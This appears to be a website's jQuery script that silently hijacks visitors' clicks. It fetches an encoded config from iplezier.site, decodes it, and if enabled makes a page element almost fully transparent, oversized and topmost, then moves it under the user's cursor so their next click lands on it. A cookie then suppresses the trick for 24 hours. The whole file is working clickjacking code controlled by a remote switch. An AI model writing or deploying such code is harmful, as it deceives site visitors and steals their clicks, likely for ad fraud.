let h12_canTrack = 0;
let h12_div = null;
let h12_pointerTracker = function(e){
    let out = {x:0, y:0};
    if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
        let touch = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0];
        out.x = touch.pageX;
        out.y = touch.pageY;
    } else if (e.type == 'mousedown' || e.type == 'mouseup' || e.type == 'mousemove' || e.type == 'mouseover'|| e.type=='mouseout' || e.type=='mouseenter' || e.type=='mouseleave') {
        out.x = e.pageX;
        out.y = e.pageY;
    }
    return out;
};
function h12_setCookie(strCookie, strValor, lngHoras) {
    let dtmData = new Date();
    let strExpires = null;
    if (lngHoras) {
        dtmData.setTime(dtmData.getTime() + (lngHoras * 60 * 1000 * 60));
        strExpires = "; expires=" + dtmData.toGMTString();
    } else {
        strExpires = "";
    }
    document.cookie = strCookie + "=" + strValor + strExpires + "; path=/";
}
function h12_getCookie(strCookie) {
    let strNomeIgual = strCookie + "=";
    let arrCookies = document.cookie.split(';');
    for (let i = 0; i < arrCookies.length; i++) {
        let strValorCookie = arrCookies[i];
        while (strValorCookie.charAt(0) == ' ') {
            strValorCookie = strValorCookie.substring(1, strValorCookie.length);
        }
        if (strValorCookie.indexOf(strNomeIgual) == 0) {
            return strValorCookie.substring(strNomeIgual.length, strValorCookie.length);
        }
    }
    return null;
}
function h12_revertDiv() {
    h12_canTrack = 0;
    $("#" + h12_div).css("top", "").css("left", "").css("z-index", "").css("position", "").css("opacity", "").css("width", "");
    $('._mdpzx4e').css('padding', '10px');
}
function h12_startScript(){
    h12_div = '_8elbiil_2970881';

    $("body").css("overflow-x", "hidden").css("width", "100%");
    $(document).on('mousemove touchstart', function(e){
        let tracker = h12_pointerTracker(e);
        if (h12_canTrack == 1) {
            $("#" + h12_div).css({
                left:  tracker.x - Math.floor(Math.random()*(10-790+1)+790),
                top:   tracker.y - ($("#" + h12_div).height() / 2)
            });
        }
    });

    if(h12_getCookie("_iplz2_delay_time") == null){
        $('#'+ h12_div +' ._co300v').remove();
        $('#'+ h12_div +' ._caknurb').attr('onclick', 'h12_clickfuncion()');
        $('._mdpzx4e').css('padding', '');

        h12_followDiv();
    }
}
function h12_followDiv() {
    h12_canTrack = 1;
    $("#" + h12_div).css("z-index", "8999999").css("position", "absolute").css("opacity", "0.0001").css("width", "800px");
}
function h12_setClick(){
    h12_setCookie("_iplz2_delay_time", '1', 24);
    document.activeElement.blur();
}
function h12_clickfuncion() {
    setTimeout(h12_setClick,200);
    setTimeout(h12_revertDiv,1000);
}
function h12_Decrypt(s1, id) {
    s1 = atob(s1);
    var result = '';
    var xx2 = s1.charAt(0);
    xx2 = xx2.charCodeAt(0) - 65;
    s1 = s1.substr(1);
    while(s1.length > 0) {

        result = result + String.fromCharCode(
            (
                s1.charAt(0).charCodeAt(0) - 65
            )
            * 25 +
            (
                s1.charAt(1).charCodeAt(0) - 65
            )
            - xx2 - id
        );

        s1 = s1.substr(2);

    }
    return result;
}
$(document).ready(function () {
    fetch('https://www.iplezier.site/assets/js/c/tns.json?ver=' + $.now())
        .then(function(response) {
            return response.text();
        })
        .then(function(body) {
            let jsonResponse = JSON.parse(h12_Decrypt(body, 1247));
            if(jsonResponse.redecanais === true){
                setTimeout(h12_startScript,4500);
            }
        });
});
